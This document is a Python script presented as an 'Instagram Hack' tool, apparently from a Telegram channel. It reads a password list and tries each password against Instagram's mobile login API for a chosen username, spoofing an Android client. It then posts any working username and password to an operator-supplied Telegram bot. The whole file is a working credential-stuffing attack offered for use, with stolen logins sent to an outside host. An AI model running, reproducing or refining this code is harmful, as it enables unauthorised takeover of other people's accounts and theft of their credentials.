import os
try:
    import requests
    import uuid
    import random
    from faker import Faker
except ModuleNotFoundError:
    os.system('pip install uuid requests faker')

uid = str(uuid.uuid4())
DvD = "android-" + str(uuid.uuid4())

# Colors
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
Z1 = '\033[2;31m'  # Second red
F = '\033[2;32m'  # Green
A = '\033[2;34m'  # Blue
C = '\033[2;35m'  # Pink
B = '\x1b[38;5;208m'  # Orange
Y = '\033[1;34m'  # Light blue
M = '\x1b[1;37m'  # White
S = '\033[1;33m'
U = '\x1b[1;37m'  # White
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'

print(f'''{B}{E}=============================={B}
|{F}[+] TeleGram  : {B} NNNM7      |
|{F}[+] Instagram  : {B}5.3aw      |
|{F}[+] Tool  : {B} Instagram Hack |
{E}==============================''')
token = input(f' {F}({C}1{F}) {Y} Enter Token{E}  ')
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} Enter ID{E}  ')

def linked():
    sg = input(
        f'''
{F}[1] Specific hack - اختراق من يوزر محدد
═════════════════════════════════
{BRed}[2] Exit - خروج
═════════════════════════════════
{B} [{C}⌯{B}] {C}Choose Number {E}» ''')
    if sg == '1':
        hack()
    elif sg == '2':
        exit()

def hack():
    email = input(f'{X}[+] ENTER Username To Hack Him - اليوزر الي تريد تخترقه: ')
    print(f'{M}_' *60)
    file = input(f'{A}[+] ENTER Name of your Combo Password: ')
    try:
        with open(file, "r") as f:
            for line in f:
                psw = line.strip()
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                           'Accept': '*/*',
                           'Cookie': 'missing',
                           'Accept-Encoding': 'gzip, deflate',
                           'Accept-Language': 'en-US',
                           'X-IG-Capabilities': '3brTvw==',
                           'X-IG-Connection-Type': 'WIFI',
                           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                           'Host': 'i.instagram.com'}
                data = {'uuid': uid, 'password': psw,
                        'username': email,
                        'device_id': DvD,
                        'from_reg': 'false',
                        '_csrftoken': 'missing',
                        'login_attempt_countn': '0'}
                req = requests.post(url, headers=headers, data=data).json()
                if 'logged_in_user' in req:
                    print(f'{F}Hacked ==> {email} | {psw}')
                    tlg = (f'''
            
Username >> {email}
password >> {psw} 
By : @NNNM7 
            ''')
                    requests.post(
                        f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    linked()
                else:
                    print(f'{E}Bad ==> {email} | {psw}')
                    
                    
    except FileNotFoundError:
        print(f"File {file} not found - ملف الباسوردات غير موجود")



linked()